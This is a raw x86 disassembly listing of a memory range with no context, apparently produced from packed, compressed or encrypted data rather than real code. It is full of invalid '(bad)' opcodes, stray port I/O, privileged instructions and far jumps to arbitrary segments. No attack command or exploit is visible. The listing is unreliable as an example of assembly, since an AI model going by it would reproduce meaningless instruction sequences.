  42c22a:	fld    DWORD PTR [eax]
  42c22c:	js     0x42c243
  42c22e:	in     al,dx
  42c22f:	add    BYTE PTR [ecx],al
  42c231:	push   eax
  42c232:	daa    
  42c233:	add    bl,bl
  42c235:	inc    esp
  42c236:	imul   ecx,DWORD PTR [esi+0x16],0x43352bc4
  42c23d:	mov    al,0x87
  42c23f:	xchg   BYTE PTR [edi-0x5e],ah
  42c242:	out    dx,al
  42c243:	pop    esi
  42c244:	sbb    edi,DWORD PTR [edx-0x679b0fab]
  42c24a:	jae    0x42c264
  42c24c:	xchg   ebx,eax
  42c24d:	(bad)  
  42c24e:	sti    
  42c24f:	push   0x17
  42c251:	stos   DWORD PTR es:[edi],eax
  42c252:	mov    ecx,0x2a4adcc2
  42c257:	stos   BYTE PTR es:[edi],al
  42c258:	add    ah,dh
  42c25a:	hlt    
  42c25b:	in     al,dx
  42c25c:	fwait
  42c25d:	adc    esi,DWORD PTR [edx+0x2c]
  42c260:	adc    al,0xa4
  42c262:	(bad)  
  42c263:	jmp    0x3915:0xf33efab6
  42c26a:	mov    BYTE PTR [esi-0x4e],ah
  42c26d:	cmp    al,BYTE PTR [ebx+0x60]
  42c270:	dec    edx
  42c271:	sbb    al,0x4
  42c273:	push   esi
  42c274:	imul   esp,DWORD PTR [edx-0x16],0xa
  42c278:	or     eax,0x500a0064
  42c27d:	pusha  
  42c27e:	or     edi,DWORD PTR [edx]
  42c280:	shl    BYTE PTR [eax+0x705d1530],cl
  42c286:	(bad)  
  42c287:	push   0x2326b456
  42c28c:	mov    WORD PTR [edx],?
  42c28e:	mov    esi,ss
  42c290:	push   ds
  42c291:	pop    esi
  42c292:	cwde   
  42c293:	fimul  DWORD PTR [ecx-0x6fc7e84a]
  42c299:	pushf  
  42c29a:	jmp    0x502c301
  42c29f:	mov    dl,0x44
  42c2a1:	bound  esp,QWORD PTR [eax+esi*8+0x77d0b680]
  42c2a8:	in     al,dx
  42c2a9:	jl     0x42c2cf
  42c2ab:	xchg   esi,eax
  42c2ac:	lea    ebp,[eax]
  42c2ae:	pop    esi
  42c2af:	inc    ebx
  42c2b0:	test   al,0xbc
  42c2b2:	mov    ch,0xa8
  42c2b4:	mov    ds:0xaaa1ee5e,al
  42c2b9:	ror    DWORD PTR [ebp-0x22],0x9e
  42c2bd:	xchg   BYTE PTR [edx],ch
  42c2bf:	sub    DWORD PTR [edx+0x45],eax
  42c2c2:	inc    ecx
  42c2c3:	inc    eax
  42c2c4:	test   dh,0x42
  42c2c7:	add    DWORD PTR ds:0x5e287cad,ecx
  42c2cd:	leave  
  42c2ce:	mov    dh,0xf1
  42c2d0:	pusha  
  42c2d1:	push   ebx
  42c2d2:	(bad)  [ecx+0x3418ee80]
  42c2d8:	mov    BYTE PTR [esi+0x42],ah
  42c2db:	sub    ah,BYTE PTR [ebx-0x105fc25f]
  42c2e1:	fadd   st(7),st
  42c2e3:	(bad)  
  42c2e4:	and    cl,BYTE PTR [eax]
  42c2e6:	cmc    
  42c2e7:	and    al,0xb5
  42c2e9:	sbb    eax,0xd6c57072
  42c2ee:	cs retf 0xea6d
  42c2f2:	retf   
  42c2f3:	inc    eax
  42c2f4:	fcmovnu st,st(2)
  42c2f6:	pop    ecx
  42c2f7:	add    bl,BYTE PTR [eax+0x51]
  42c2fa:	fcmove st,st(2)
  42c2fc:	xchg   BYTE PTR [ebp-0x2587555f],ch
  42c302:	pop    edx
  42c303:	adc    al,cl
  42c305:	fwait
  42c306:	jbe    0x42c37c
  42c308:	inc    eax
  42c309:	sbb    dl,BYTE PTR [ebx]
  42c30b:	inc    edx
  42c30c:	push   0xbebea805
  42c311:	adc    DWORD PTR [eax],esi
  42c313:	inc    esi
  42c314:	sbb    edi,DWORD PTR [edx]
  42c316:	pop    edx
  42c317:	push   edi
  42c318:	cmp    BYTE PTR [esi+0x50],ch
  42c31b:	mov    dl,0x8e
  42c31d:	cld    
  42c31e:	cmp    DWORD PTR [edi+eiz*1-0x754ae99f],0x66
  42c326:	sub    BYTE PTR [esi-0x7f],bl
  42c329:	mov    al,ds:0x68d18293
  42c32e:	sub    ch,BYTE PTR [edx+edi*2+0x3d]
  42c332:	mov    ah,0xd0
  42c334:	fs (bad) 
  42c336:	dec    esi
  42c337:	and    DWORD PTR [ebx+esi*1],ebp
  42c33a:	ja     0x42c3ab
  42c33c:	add    ebx,DWORD PTR [ebp-0x698c43ee]
  42c342:	push   es
  42c343:	daa    
  42c344:	and    DWORD PTR [esi+0x4448dcd6],0x335be1a
  42c34e:	test   DWORD PTR [ebx],edx
  42c350:	add    ah,dl
  42c352:	lods   al,BYTE PTR ds:[esi]
  42c353:	lods   al,BYTE PTR ds:[esi]
  42c354:	in     eax,dx
  42c355:	adc    al,BYTE PTR [eax]
  42c357:	call   0xc096:0x3507023b
  42c35e:	jp     0x42c38e
  42c360:	stos   BYTE PTR es:[edi],al
  42c361:	mov    es,WORD PTR [edx]
  42c363:	imul   ebx,DWORD PTR [edx-0xc393bcb],0x12
  42c36a:	inc    eax
  42c36b:	jb     0x42c2ef
  42c36d:	xchg   BYTE PTR [esi],ah
  42c36f:	push   eax
  42c370:	mov    edx,0x6c576258
  42c375:	xchg   esp,eax
  42c376:	test   al,0x79
  42c378:	ret    
  42c379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c37a:	sti    
  42c37b:	(bad)  
  42c37c:	jae    0x42c37e
  42c37e:	mov    ch,0xa5
  42c380:	ins    DWORD PTR es:[edi],dx
  42c381:	mov    dh,0x70
  42c383:	cmp    DWORD PTR [edx*4-0x579f37c6],eax
  42c38a:	cld    
  42c38b:	push   esi
  42c38c:	test   al,0x7e
  42c38e:	adc    DWORD PTR [eax-0x23c33db3],ebp
  42c394:	pop    edi
  42c395:	or     cl,BYTE PTR [edx+0x4c1a8a6]
  42c39b:	inc    esp
  42c39c:	pop    ds
  42c39d:	mov    al,0x98
  42c39f:	ds hlt 
  42c3a1:	xchg   ebx,eax
  42c3a2:	pop    ecx
  42c3a3:	add    BYTE PTR [esi-0x3520ebf4],0x62
  42c3aa:	jmp    0xd1194a13
  42c3af:	pop    edx
  42c3b0:	aaa    
  42c3b1:	jbe    0x42c37d
  42c3b3:	call   0xe687:0xbe060ef4
  42c3ba:	push   esi
  42c3bb:	hlt    
  42c3bc:	mov    ah,BYTE PTR [edx-0x11547fff]
  42c3c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3c3:	dec    ebp
  42c3c4:	add    BYTE PTR [edi-0x4e71f88c],ch
  42c3ca:	lock or eax,edx
  42c3cd:	loope  0x42c405
  42c3cf:	push   ss
  42c3d0:	mov    eax,ds:0xb50628c2
  42c3d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c3d6:	shl    BYTE PTR [eax+edi*1],0xd4
  42c3da:	fidiv  DWORD PTR [eax+0x14848835]
  42c3e0:	sbb    BYTE PTR [edx-0xd],bh
  42c3e3:	cmp    bh,dh
  42c3e5:	add    ebp,DWORD PTR [esi]
  42c3e7:	or     al,0xbc
  42c3e9:	adc    ah,BYTE PTR [eax]
  42c3eb:	addr16 mov cl,0x6a
  42c3ee:	out    dx,al
  42c3ef:	and    al,0x1a
  42c3f1:	or     bl,BYTE PTR [edx]
  42c3f3:	cmp    BYTE PTR [edi-0x6a],cl
  42c3f6:	(bad)  
  42c3f8:	ret    
  42c3f9:	mov    ch,0xc0
  42c3fb:	mov    dh,0xa6
  42c3fd:	cwde   
  42c3fe:	sub    bh,BYTE PTR ds:0xfa38af94
  42c404:	jb     0x42c395
  42c406:	pushf  
  42c407:	and    DWORD PTR [ecx-0x7963b4f6],eax
  42c40d:	push   ecx
  42c40e:	in     al,dx
  42c40f:	inc    eax
  42c410:	xor    edi,DWORD PTR [ebx]
  42c412:	fidivr DWORD PTR [eax]
  42c414:	pop    esi
  42c415:	push   ds
  42c416:	ss jp  0x42c39b
  42c419:	cmp    cl,BYTE PTR [ebp+0x5e]
  42c41c:	add    edi,DWORD PTR [ebx]
  42c41e:	aam    0x1e
  42c420:	shl    cl,cl
  42c422:	push   ebp
  42c423:	pusha  
  42c424:	sbb    esi,DWORD PTR [ecx-0x13]
  42c427:	clc    
  42c428:	mov    ds:0x46b03e1a,al
  42c42d:	push   es
  42c42e:	stos   BYTE PTR es:[edi],al
  42c42f:	(bad)
  42c432:	push   ss
  42c433:	sbb    al,0xab
  42c435:	out    dx,al
  42c436:	xchg   edx,eax
  42c437:	fsubp  st(0),st
  42c439:	scas   al,BYTE PTR es:[edi]
  42c43a:	dec    eax
  42c43b:	sub    DWORD PTR [eax],edx
  42c43d:	jp     0x42c467
  42c43f:	std    
  42c440:	out    0x92,al
  42c442:	xor    al,0xca
  42c444:	imul   esp,eax,0xffffffed
  42c447:	xchg   ebp,eax
  42c448:	test   ebp,ebp
  42c44a:	outs   dx,BYTE PTR ds:[esi]
  42c44b:	xchg   edx,eax
  42c44c:	fs dec edx
  42c44e:	sti    
  42c44f:	dec    edx
  42c450:	sub    DWORD PTR [ebx],0x3aea84ee
  42c456:	inc    esi
  42c457:	imul   eax,DWORD PTR [eax-0x2],0x34
  42c45b:	add    DWORD PTR [eax-0x47],eax
  42c45e:	xchg   ah,dl
  42c460:	add    DWORD PTR [edi],ebp
  42c462:	or     BYTE PTR [eax+ebp*4-0x6b252b8d],ch
  42c469:	test   DWORD PTR [eax],edx
  42c46b:	add    ebx,DWORD PTR [ebp-0x30]
  42c46e:	jle    0x42c430
  42c470:	in     eax,0x74
  42c472:	adc    al,0x5d
  42c474:	test   al,0x6d
  42c476:	pop    esp
  42c477:	xchg   edx,ecx
  42c479:	push   edx
  42c47a:	ins    DWORD PTR es:[edi],dx
  42c47b:	mov    ?,eax
  42c47d:	outs   dx,BYTE PTR ds:[esi]
  42c47e:	lods   eax,DWORD PTR ds:[esi]
  42c47f:	ret    
  42c480:	add    dl,BYTE PTR [esp+esi*2-0x46]
  42c484:	mov    dh,0x9a
  42c486:	jle    0x42c4ce
  42c488:	mov    eax,DWORD PTR [edi]
  42c48a:	xchg   edx,eax
  42c48b:	(bad)  
  42c48c:	or     DWORD PTR [edx],0xb80e7c43
  42c492:	xchg   ecx,eax
  42c493:	cli    
  42c494:	push   esp
  42c495:	out    dx,al
  42c496:	xor    eax,0x1a0d0519
  42c49b:	lahf   
  42c49c:	ins    BYTE PTR es:[edi],dx
  42c49d:	sub    al,0xcc
  42c49f:	clc    
  42c4a0:	add    BYTE PTR [eax-0x5],al
  42c4a3:	or     DWORD PTR [esi+0x522ef9ee],esi
  42c4a9:	ror    BYTE PTR [eax-0x60],0xe8
  42c4ad:	shl    BYTE PTR [esp+ecx*4],cl
  42c4b0:	lea    ebx,[eax+0x41]
  42c4b3:	imul   ebp,DWORD PTR [eax-0x53],0xffffff9c
  42c4b7:	out    0x76,al
  42c4b9:	retf   0x48e2
  42c4bc:	outs   dx,BYTE PTR ds:[esi]
  42c4bd:	fcmovbe st,st(6)
  42c4bf:	inc    ebp
  42c4c0:	scas   al,BYTE PTR es:[edi]
  42c4c1:	call   0xf508:0x28574360
  42c4c8:	clc    
  42c4c9:	sbb    DWORD PTR [ebx],edx
  42c4cb:	js     0x42c4d1
  42c4cd:	push   es
  42c4ce:	(bad)  
  42c4cf:	scas   al,BYTE PTR es:[edi]
  42c4d0:	cs xor eax,0x3adf0292
  42c4d6:	or     BYTE PTR [ecx-0x50],dh
  42c4d9:	add    eax,0x2e3a0f05
  42c4de:	data16 test BYTE PTR [edx+esi*2-0x49dfc5e9],0xf6
  42c4e7:	jmp    0x401e:0xa864d7e
  42c4ee:	imul   edx,DWORD PTR [eax+0x43],0xf41f6d83
  42c4f5:	call   0x7544:0xa85f9be
  42c4fc:	sbb    dl,ah
  42c4fe:	sbb    ch,BYTE PTR [ebx+eax*2-0xe]
  42c502:	xor    bh,BYTE PTR [esi+0x4b747c8c]
  42c508:	xor    al,0xf0
  42c50a:	add    BYTE PTR [edi+0x58],0x51
  42c50e:	mov    WORD PTR [esp+ebx*8],es
  42c511:	jmp    0xd6918b6d
  42c516:	lea    ecx,[esi]
  42c518:	push   ebx
  42c519:	push   eax
  42c51a:	call   0x42caea10
  42c51f:	jno    0x42c509
  42c521:	pop    es
  42c522:	adc    bl,BYTE PTR [edx]
  42c524:	ret    0x58bd
  42c527:	add    bh,BYTE PTR [ecx-0x4d577e00]
  42c52d:	(bad)  
  42c52e:	mov    ch,0x6e
  42c530:	jp     0x42c59a
  42c532:	stos   BYTE PTR es:[edi],al
  42c533:	mov    edx,0x1e7c0c04
  42c538:	sbb    al,0xac
  42c53a:	test   al,0xa8
  42c53c:	sub    BYTE PTR [edx-0x6c],dh
  42c53f:	rcr    BYTE PTR [eax+0x34],0xaf
  42c543:	push   edx
  42c544:	cmp    al,0x63
  42c546:	pusha  
  42c547:	mov    dh,0x70
  42c549:	add    DWORD PTR [eax],esi
  42c54b:	and    dl,0x47
  42c54e:	ror    ebp,cl
  42c550:	(bad)  
  42c551:	sub    al,0x6a
  42c553:	sbb    al,0xd0
  42c555:	bnd jns 0x42c558
  42c558:	mov    bl,0x76
  42c55a:	sti    
  42c55b:	adc    dl,BYTE PTR [ebx+0x47]
  42c55e:	mov    ds:0x7fbe2c5a,eax
  42c563:	mov    ch,BYTE PTR [ebx-0x6a]
  42c566:	xor    bl,BYTE PTR [eax+0x48]
  42c569:	pop    ecx
  42c56a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c56b:	add    al,0x24
  42c56d:	std    
  42c56e:	mov    gs,WORD PTR [edx]
  42c570:	shl    BYTE PTR [ebx],0x50
  42c573:	sub    bl,BYTE PTR [esi-0x6289b5f8]
  42c579:	inc    eax
  42c57a:	fistp  DWORD PTR [edx]
  42c57c:	pop    esp
  42c57d:	repnz mov esp,0x8d973ad6
  42c583:	or     dh,BYTE PTR [ebx+0x20]
  42c586:	mov    al,0xea
  42c588:	add    ecx,DWORD PTR [eax+edi*8]
  42c58b:	shl    BYTE PTR [ebx-0x65],0xa0
  42c58f:	or     DWORD PTR [eax],ebp
  42c591:	clc    
  42c592:	xchg   esp,eax
  42c593:	sub    DWORD PTR [esi],esi
  42c595:	pop    es
  42c596:	xchg   esi,eax
  42c597:	mov    ecx,0x48f6d4d7
  42c59c:	lods   al,BYTE PTR ds:[esi]
  42c59d:	sub    esp,DWORD PTR [eax-0x250f77f2]
  42c5a3:	call   0xf4b07e90
  42c5a8:	outs   dx,DWORD PTR ds:[esi]
  42c5a9:	rol    DWORD PTR [eax-0x29],cl
  42c5ac:	add    dl,ch
  42c5ae:	pusha  
  42c5af:	fwait
  42c5b0:	lock mov ebp,0xaaf68ed9
  42c5b6:	and    dh,BYTE PTR [ebp+0x184d108c]
  42c5bc:	retf   
  42c5bd:	adc    dl,bh
  42c5bf:	cmp    BYTE PTR [edx],0x2a
  42c5c2:	sub    eax,0x5b9c09dc
  42c5c7:	sub    DWORD PTR [edi-0x13434756],0x13aec010
  42c5d1:	int3   
  42c5d2:	add    BYTE PTR [ebx+ecx*8-0x40],ah
  42c5d6:	and    ah,BYTE PTR [ebx-0x33d1c3c2]
  42c5dc:	mov    al,0xa4
  42c5de:	ds inc ebx
  42c5e0:	mov    al,0xc1
  42c5e2:	ss das 
  42c5e4:	jmp    0x42c5be
  42c5e6:	mov    BYTE PTR [esi-0x2f0936aa],dh
  42c5ec:	push   0x6230ad45
  42c5f1:	cmp    cl,BYTE PTR [ecx+0x50]
  42c5f4:	sysenter 
  42c5f6:	adc    al,0x5e
  42c5f8:	sbb    DWORD PTR [ebx+0x19caf69a],ecx
  42c5fe:	mov    al,0x81
  42c600:	and    eax,0xd339c8bc
  42c605:	cli    
  42c606:	adc    dl,al
  42c608:	fmul   QWORD PTR [eax-0x60]
  42c60b:	loop   0x42c64f
  42c60d:	adc    al,BYTE PTR [ebx+0x5e80810]
  42c613:	sbb    eax,0xa14ca096
  42c618:	mov    ah,0xa
  42c61a:	add    eax,0x686a90ba
  42c61f:	push   0xc1e300cd
  42c624:	mov    esi,0x27e1a78
  42c629:	pop    ebp
  42c62a:	leave  
  42c62b:	inc    edx
  42c62c:	adc    ebp,DWORD PTR [ebp-0x49087816]
  42c632:	pop    esi
  42c633:	aam    0xa
  42c635:	sbb    ch,BYTE PTR [eax+ebp*4+0xbe67b36]
  42c63c:	pop    eax
  42c63d:	xor    bl,BYTE PTR [esi]
  42c63f:	pop    edx
  42c640:	cwde   
  42c641:	mov    al,ds:0x723bf9aa
  42c646:	dec    ebp
  42c647:	xlat   BYTE PTR ds:[ebx]
  42c648:	add    ch,bl
  42c64a:	(bad)  
  42c64c:	xor    bl,dl
  42c64e:	push   es
  42c64f:	loopne 0x42c659
  42c651:	mov    esi,0xccc661c3
  42c656:	fadd   st,st(7)
  42c658:	add    BYTE PTR ds:0x935eae4,ch
  42c65e:	sub    al,BYTE PTR [esi+ebx*1]
  42c661:	xor    eax,DWORD PTR [edx+ecx*8-0x5d919505]
  42c668:	mov    al,ds:0xc1e3c8e
  42c66d:	push   esp
  42c66e:	call   0x6c451c0f
  42c673:	jmp    0x2e1e:0x12164832
  42c67a:	mov    dh,BYTE PTR [ebp+0x14]
  42c67d:	sbb    DWORD PTR [esp+esi*1],eax
  42c680:	mov    es,WORD PTR [eax-0x44]
  42c683:	gs cmc 
  42c685:	add    eax,0x82f616cd
  42c68a:	push   0x16
  42c68c:	jl     0x42c702
  42c68e:	test   BYTE PTR [edi-0x63],al
  42c691:	add    BYTE PTR [eax-0x3bea2553],dl
  42c697:	pop    ss
  42c698:	cmp    dl,bl
  42c69a:	mov    eax,0x2ea70075
  42c69f:	jmp    0x42c6b5
  42c6a1:	stos   DWORD PTR es:[edi],eax
  42c6a2:	test   BYTE PTR [eax],ah
  42c6a4:	xor    al,BYTE PTR [esi+edi*4+0x57586a1a]
  42c6ab:	jmp    0x42c641
  42c6ad:	inc    eax
  42c6ae:	shr    eax,1
  42c6b0:	call   0x42c5b405
  42c6b5:	push   ebx
  42c6b6:	sbb    esi,DWORD PTR [esi]
  42c6b8:	xchg   edx,eax
  42c6b9:	jbe    0x42c68d
  42c6bb:	ret    0x91
  42c6be:	outs   dx,BYTE PTR ds:[esi]
  42c6bf:	test   al,0x68
  42c6c1:	dec    edi
  42c6c2:	(bad)  
  42c6c3:	mov    ah,0xa6
  42c6c5:	dec    edx
  42c6c6:	mov    al,0x94
  42c6c8:	xchg   BYTE PTR [eax],dl
  42c6ca:	jno    0x42c734
  42c6cc:	xchg   esi,eax
  42c6cd:	adc    BYTE PTR [edx],ch
  42c6cf:	ins    BYTE PTR es:[edi],dx
  42c6d0:	jle    0x42c67c
  42c6d2:	into   
  42c6d3:	dec    DWORD PTR [ebp-0x4a]
  42c6d6:	cmp    eax,0x9a610288
  42c6db:	and    al,BYTE PTR [edx-0x72]
  42c6de:	push   0x2f
  42c6e0:	test   al,0x26
  42c6e2:	or     BYTE PTR ds:0x512a3326,cl
  42c6e8:	dec    ebp
  42c6e9:	inc    ebp
  42c6ea:	rol    DWORD PTR ds:0x6b92919c,1
  42c6f0:	dec    esp
  42c6f1:	or     BYTE PTR [ecx],ch
  42c6f3:	aam    0x70
  42c6f5:	test   BYTE PTR ds:0x3ccac912,bl
  42c6fb:	outs   dx,DWORD PTR ds:[esi]
  42c6fc:	and    BYTE PTR [ebx],cl
  42c6fe:	adc    eax,0x88234207
  42c703:	xchg   DWORD PTR [edx+0xbb67061],eax
  42c709:	inc    ebp
  42c70a:	dec    esi
  42c70b:	add    ah,bl
  42c70d:	outs   dx,BYTE PTR ds:[esi]
  42c70e:	popf   
  42c70f:	mov    bh,BYTE PTR [esi]
  42c711:	inc    ecx
  42c712:	je     0x42c778
  42c714:	inc    ecx
  42c715:	push   eax
  42c716:	dec    ecx
  42c717:	cmp    BYTE PTR [ebx-0x75],bh
  42c71a:	or     cl,BYTE PTR [ebx+edi*4]
  42c71d:	aam    0x36
  42c71f:	in     al,dx
  42c720:	inc    esp
  42c721:	sbb    BYTE PTR [edi+0x35949b62],ch
  42c727:	jl     0x42c772
  42c729:	pop    ebp
  42c72a:	xchg   edx,eax
  42c72b:	lods   al,BYTE PTR ds:[esi]
  42c72c:	into   
  42c72d:	mov    al,0x38
  42c72f:	daa    
  42c730:	lods   al,BYTE PTR ds:[esi]
  42c731:	push   0x53807418
  42c736:	in     al,0xbc
  42c738:	sub    eax,DWORD PTR [edx+0x2d15c343]
  42c73e:	push   edx
  42c73f:	push   esp
  42c740:	push   edx
  42c741:	inc    ebp
  42c742:	inc    eax
  42c743:	outs   dx,BYTE PTR ds:[esi]
  42c744:	test   DWORD PTR [ebx-0x277cbc7a],esi
  42c74a:	or     al,0x82
  42c74c:	inc    eax
  42c74d:	in     al,0xe2
  42c74f:	sti    
  42c750:	push   eax
  42c751:	push   esp
  42c752:	test   al,0x20
  42c754:	cmp    al,0x24
  42c756:	and    al,0x68
  42c758:	call   0x255b1e14
  42c75d:	xor    al,0xf8
  42c75f:	test   al,0x4
  42c761:	loop   0x42c758
  42c763:	push   esp
  42c764:	mov    bh,BYTE PTR [eax]
  42c766:	xor    dl,al
  42c768:	loop   0x42c705
  42c76a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c76b:	pop    esp
  42c76c:	scas   al,BYTE PTR es:[edi]
  42c76d:	scas   eax,DWORD PTR es:[edi]
  42c76e:	push   0x2374bc50
  42c773:	push   0xa
  42c775:	out    dx,al
  42c776:	add    BYTE PTR [eax-0x25ff5bad],bh
  42c77c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c77d:	or     DWORD PTR [ecx+0x32],0x41b13418
  42c784:	cmc    
  42c785:	sub    BYTE PTR [eax-0x24],0x26
  42c789:	cmp    al,0xeb
  42c78b:	sub    dh,dh
  42c78d:	int    0xb1
  42c78f:	mov    al,ds:0x5244eca2
  42c794:	shl    DWORD PTR [eax+0x4f],0xea
  42c798:	int3   
  42c799:	dec    esp
  42c79a:	pop    es
  42c79b:	mov    eax,0xc8187435
  42c7a0:	jb     0x42c782
  42c7a2:	push   0x5e000ea6
  42c7a7:	push   0x4e2d9543
  42c7ac:	mov    ebx,0x95c00a48
  42c7b1:	ds push edx
  42c7b3:	shl    ch,1
  42c7b5:	rol    al,0x4f
  42c7b8:	sbb    dl,BYTE PTR [esp+ebp*4-0x2e]
  42c7bc:	mov    ebp,0x2ad0d677
  42c7c1:	ds dec esp
  42c7c3:	int3   
  42c7c4:	hlt    
  42c7c5:	cmp    BYTE PTR [edx],cl
  42c7c7:	je     0x42c7cb
  42c7c9:	sbb    DWORD PTR [eax+ebp*4],0xdbc2cbe0
  42c7d0:	jecxz  0x42c818
  42c7d2:	call   0x1d581e3d
  42c7d7:	mov    dh,0xa2
  42c7d9:	jp     0x42c80a
  42c7db:	(bad)  
  42c7dc:	outs   dx,BYTE PTR ds:[esi]
  42c7dd:	lea    edi,[eax+0x3f28341e]
  42c7e3:	dec    edi
  42c7e4:	ins    BYTE PTR es:[edi],dx
  42c7e5:	push   0x64bee84d
  42c7ea:	pop    ebx
  42c7eb:	adc    al,0xfd
  42c7ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c7ee:	(bad)  
  42c7ef:	mov    ds:0x8dd80c89,al
  42c7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c7f5:	cmp    bh,BYTE PTR [esi]
  42c7f7:	les    edi,FWORD PTR [ebp+0x55]
  42c7fa:	(bad)  
  42c7fc:	mov    esi,0x1cd410
  42c801:	adc    BYTE PTR [ebx-0x22],dh
  42c804:	xor    ecx,DWORD PTR [esi-0x80]
  42c807:	push   edx
  42c808:	or     DWORD PTR [eax-0x23c535eb],esi
  42c80e:	rcr    BYTE PTR [esi-0x1264f2fd],1
  42c814:	outs   dx,BYTE PTR ds:[esi]
  42c815:	jmp    0x3e08:0x2a7c040b
  42c81c:	(bad)  ds:0xc2b8191
  42c822:	fwait
  42c823:	aam    0x4b
  42c825:	int    0xd
  42c827:	mov    eax,0x6b16c830
  42c82c:	add    BYTE PTR ds:0xf07052b8,al
  42c832:	cld    
  42c833:	retf   0x2c6d
  42c836:	ret    0x4fb6
  42c839:	or     cl,bl
  42c83b:	jbe    0x42c868
  42c83d:	pushf  
  42c83e:	fs loope 0x42c7d9
  42c841:	adc    dh,bl
  42c843:	mov    WORD PTR [eax+eax*1-0x3a],fs
  42c847:	aaa    
  42c848:	adc    al,bh
  42c84a:	ret    0xd127
  42c84d:	or     ah,dl
  42c84f:	inc    ecx
  42c850:	lods   al,BYTE PTR ds:[esi]
  42c851:	add    dh,BYTE PTR [ebp+0x25]
  42c854:	mov    al,ds:0xfefafe11
  42c859:	mov    esp,0xd0ba064f
  42c85e:	outs   dx,BYTE PTR ds:[esi]
  42c85f:	pop    ss
  42c860:	and    al,0x38
  42c862:	inc    DWORD PTR fs:[ebp-0xd]
  42c866:	push   edi
  42c867:	ins    DWORD PTR es:[edi],dx
  42c868:	or     dh,BYTE PTR [edx]
  42c86a:	shr    edx,cl
  42c86c:	jmp    0xed5871
  42c871:	xchg   edx,eax
  42c872:	cmp    dl,BYTE PTR ds:0x89ed
  42c877:	les    ebp,FWORD PTR [esi]
  42c879:	mov    esp,0xf3544629
  42c87e:	mov    dl,0x30
  42c880:	or     eax,0x61aa0362
  42c885:	fmulp  st(4),st
  42c887:	mov    al,0x9a
  42c889:	jo     0x42c89f
  42c88b:	push   ecx
  42c88c:	push   0xf3082828
  42c891:	dec    eax
  42c892:	inc    ebp
  42c893:	push   ebx
  42c894:	sub    DWORD PTR [ebp+0x6a9f4f22],0x56
  42c89b:	mov    ebp,DWORD PTR [eax]
  42c89d:	icebp  
  42c89e:	inc    esi
  42c89f:	dec    ebx
  42c8a0:	or     edi,DWORD PTR [ebx]
  42c8a2:	pop    edx
  42c8a3:	aam    0x28
  42c8a5:	sub    al,dh
  42c8a7:	or     ecx,esi
  42c8a9:	cli    
  42c8aa:	push   0x54da144f
  42c8af:	mov    ebx,0x6d7c3d5e
  42c8b4:	pop    eax
  42c8b5:	or     edx,edi
  42c8b7:	gs je  0x42c8c2
  42c8ba:	repnz add esi,ebp
  42c8bd:	inc    ebx
  42c8be:	jp     0x42c846
  42c8c0:	lock sub DWORD PTR [edx],0x6e
  42c8c4:	dec    eax
  42c8c5:	enter  0xf00b,0x6d
  42c8c9:	push   ebp
  42c8ca:	jmp    0x42c944
  42c8cc:	mov    al,ds:0x3a9590b1
  42c8d1:	shr    BYTE PTR [eax+0x27046d7e],1
  42c8d7:	adc    al,0x1c
  42c8d9:	sbb    BYTE PTR ds:0xb2e0916e,cl
  42c8df:	dec    esi
  42c8e0:	pop    esi
  42c8e1:	mov    BYTE PTR ds:0x5cee2198,ch
  42c8e7:	inc    ebp
  42c8e8:	adc    eax,0x9ce228c1
  42c8ed:	out    dx,al
  42c8ee:	mov    cs,WORD PTR [esi]
  42c8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8f1:	jno    0x42c925
  42c8f3:	inc    ebx
  42c8f4:	loop   0x42c920
  42c8f6:	ja     0x42c8be
  42c8f8:	jae    0x42c8bd
  42c8fa:	mov    ch,BYTE PTR [esi-0x59db315e]
  42c900:	int    0x7a
  42c902:	push   0x57240086
  42c907:	ret    0x6203
  42c90a:	fnsave [eax+eiz*2-0x1e3b71fb]
  42c911:	sbb    ch,BYTE PTR [esi-0x2d45aa53]
  42c917:	(bad)  
  42c918:	(bad)  
  42c919:	in     eax,0x50
  42c91b:	xor    bl,BYTE PTR [eax]
  42c91d:	jle    0x42c93a
  42c91f:	mov    ebx,0x803f87bc
  42c924:	mov    fs:0x4d6d8302,eax
  42c92a:	or     al,0x26
  42c92c:	mov    esi,0xbc7ccaa5
  42c931:	pop    esi
  42c932:	inc    esp
  42c933:	inc    ebp
  42c934:	mov    dh,0xb9
  42c936:	push   0x23
  42c938:	popa   
  42c939:	mov    ds:0x2c3500e1,al
  42c93e:	push   ds
  42c93f:	inc    esi
  42c940:	mov    esp,0x6d05f602
  42c945:	xchg   BYTE PTR [esi-0x362c51a],bh
  42c94b:	mov    ds:0x1a14828e,al
  42c950:	add    BYTE PTR [esi+ebx*8-0x60190942],dh
  42c957:	or     al,0x2d
  42c959:	mov    al,0xd7
  42c95b:	pop    esi
  42c95c:	add    esi,DWORD PTR [ecx-0x413dff54]
  42c962:	xchg   DWORD PTR [edx+edi*4],edx
  42c965:	jno    0x42c9b9
  42c967:	rcl    BYTE PTR [esi],1
  42c969:	adc    BYTE PTR [bx],ch
  42c96c:	fadd   DWORD PTR [edx+0x78ac0875]
  42c972:	cs sub ebp,DWORD PTR fs:[ecx+edx*4-0x3e]
  42c978:	outs   dx,BYTE PTR ds:[esi]
  42c979:	adc    DWORD PTR [ebx],esi
  42c97b:	lods   al,BYTE PTR ds:[esi]
  42c97c:	pop    eax
  42c97d:	sbb    BYTE PTR [esp+edi*2+0x5b06d30a],dh
  42c984:	mov    WORD PTR [esi-0x37],ds
  42c987:	cs push cs
  42c989:	mov    edx,0x6cbe3a2a
  42c98e:	jp     0x42c9e6
  42c990:	ret    
  42c991:	ret    
  42c992:	or     dh,0x93
  42c995:	sub    al,0x3
  42c997:	dec    esp
  42c998:	adc    cl,cl
  42c99a:	mov    ebx,DWORD PTR [edi+ebp*4+0x8]
  42c99e:	cmp    BYTE PTR fs:[ebx-0x5629cdd4],al
  42c9a5:	inc    edx
  42c9a6:	fcmovnbe st,st(1)
  42c9a8:	or     al,0x98
  42c9aa:	call   0xce10:0x548090ee
  42c9b1:	mov    BYTE PTR [ebp+0xd],dl
  42c9b4:	inc    edi
  42c9b5:	mov    ah,ch
  42c9b7:	sahf   
